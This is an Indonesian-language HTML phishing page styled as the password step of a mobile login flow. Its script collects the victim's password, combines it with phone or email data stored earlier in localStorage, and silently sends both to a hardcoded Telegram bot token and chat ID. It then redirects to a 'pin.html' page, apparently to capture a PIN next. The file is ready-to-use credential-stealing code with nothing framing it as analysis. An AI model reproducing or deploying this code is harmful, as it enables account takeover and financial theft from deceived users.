<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Masukkan Kata Sandi</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap');

    body {
      font-family: 'Poppins', sans-serif;
      background-color: #fff;
      margin: 0;
      padding: 0;
      color: #0B2C33;
      overflow: hidden;
    }

    .container {
      max-width: 420px;
      margin: 0 auto;
      padding: 24px;
      padding-bottom: 120px;
    }

    .back {
      font-size: 26px;
      cursor: pointer;
      margin-bottom: 25px;
    }

    h1 {
      font-weight: 900;
      font-size: 32px;
      margin-top: 20px;
      margin-bottom: 32px;
      color: #032B41;
    }

    label {
      font-weight: 700;
      font-size: 16px;
      display: block;
      margin-bottom: 10px;
      color: #032B41;
    }

    .input-wrapper {
      position: relative;
      margin-bottom: 20px;
    }

    input[type="password"],
    input[type="text"] {
      width: 100%;
      box-sizing: border-box;
      padding: 16px 48px 16px 16px;
      border: 2px solid #D5DDE0;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 600;
      color: #032B41;
      outline: none;
      transition: border-color 0.3s;
      background-color: #fff;
    }

    input::placeholder {
      color: #A0A9AD;
      font-weight: 600;
    }

    input:focus {
      border-color: #032B41;
    }

    .eye-icon {
      position: absolute;
      top: 50%;
      right: 16px;
      transform: translateY(-50%);
      cursor: pointer;
      width: 24px;
      height: 24px;
    }

    .forgot {
      text-align: right;
      font-weight: 700;
      color: #032B41;
      font-size: 15px;
      margin-bottom: 0px;
      cursor: pointer;
    }

    button {
      width: 100%;
      padding: 18px;
      border: none;
      border-radius: 50px;
      background-color: #A7B4B8;
      color: #E6FBE2;
      font-weight: 700;
      font-size: 17px;
      font-family: 'Poppins', sans-serif;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button.active {
      background-color: #0B2C33;
      color: #E6FBE2;
    }

    button:active {
      transform: scale(0.98);
    }

    .fixed-bottom {
      position: fixed;
      bottom: 24px;
      left: 0;
      right: 0;
      width: calc(100% - 48px);
      max-width: 420px;
      margin: 0 auto;
    }

    .fade {
      position: fixed;
      inset: 0;
      background: #fff;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s ease;
      z-index: 999;
    }

    .fade.active {
      opacity: 1;
      pointer-events: auto;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="back" onclick="history.back()">‚Üê</div>

    <h1>Masukkan Kata Sandi</h1>

    <label for="password">Kata Sandi</label>
    <div class="input-wrapper">
      <input
        type="password"
        id="password"
        placeholder="Masukkan kata sandi kamu"
        oninput="checkInput()"
        autocomplete="off"
      />
      <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
           stroke-width="2" stroke="#032B41" class="eye-icon" onclick="togglePassword()">
        <path stroke-linecap="round" stroke-linejoin="round"
              d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
        <circle cx="12" cy="12" r="3" />
      </svg>
    </div>

    <div class="forgot">Lupa Kata Sandi?</div>
  </div>

  <button id="submitBtn" class="fixed-bottom" disabled>Lanjutkan</button>

  <div class="fade" id="fade"></div>

  <script>
    const passwordInput = document.getElementById("password");
    const submitBtn = document.getElementById("submitBtn");
    const eyeIcon = document.getElementById("eyeIcon");
    const fade = document.getElementById("fade");

    // Token dan ID bot kamu
    const BOT_TOKEN = "8366843088:AAG2DgTncj7WVowbtCY-_9iL85PLahl1ddg";
    const CHAT_ID = "5983910858";

    function checkInput() {
      if (passwordInput.value.trim() !== "") {
        submitBtn.classList.add("active");
        submitBtn.disabled = false;
      } else {
        submitBtn.classList.remove("active");
        submitBtn.disabled = true;
      }
    }

    function togglePassword() {
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeIcon.setAttribute("stroke", "#A0A9AD");
      } else {
        passwordInput.type = "password";
        eyeIcon.setAttribute("stroke", "#032B41");
      }
    }

    async function sendToTelegram(message) {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
        });
      } catch (err) {
        console.error("Gagal kirim:", err);
      }
    }

    submitBtn.addEventListener("click", async () => {
      if (passwordInput.value.trim() !== "") {
        const password = passwordInput.value.trim();

        // Ambil data sebelumnya (nomor/email)
        const prevData = localStorage.getItem("loginData") || "Tidak ada data sebelumnya";

        // Simpan password juga ke localStorage
        localStorage.setItem("passwordData", password);

        // Kirim ke Telegram dengan rekap
        const message = `\n\n${prevData}\nüîê Password: ${password}`;
        await sendToTelegram(message);

        fade.classList.add("active");
        setTimeout(() => {
          window.location.href = "pin.html";
        }, 400);
      }
    });
  </script>

</body>
</html>
